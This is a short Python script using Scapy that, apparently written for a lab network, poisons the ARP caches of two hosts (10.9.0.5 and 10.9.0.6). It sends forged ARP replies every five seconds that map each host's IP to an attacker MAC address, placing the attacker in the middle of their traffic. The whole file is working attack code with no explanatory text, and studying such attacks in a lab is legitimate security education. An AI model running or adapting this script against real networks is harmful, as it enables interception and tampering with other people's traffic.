#!/usr/bin/env python3
from scapy.all import *
import time

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"
MAC_M = "02:42:0a:09:00:69"

def poison_arp():
    # Poison A's cache: B's IP -> M's MAC
    pkt_A = Ether(dst=MAC_A)/ARP(op=2, psrc=IP_B, hwsrc=MAC_M, pdst=IP_A)
    
    # Poison B's cache: A's IP -> M's MAC
    pkt_B = Ether(dst=MAC_B)/ARP(op=2, psrc=IP_A, hwsrc=MAC_M, pdst=IP_B)
    
    sendp(pkt_A)
    sendp(pkt_B)
    print("Sent ARP poison packets")

while True:
    poison_arp()
    time.sleep(5)
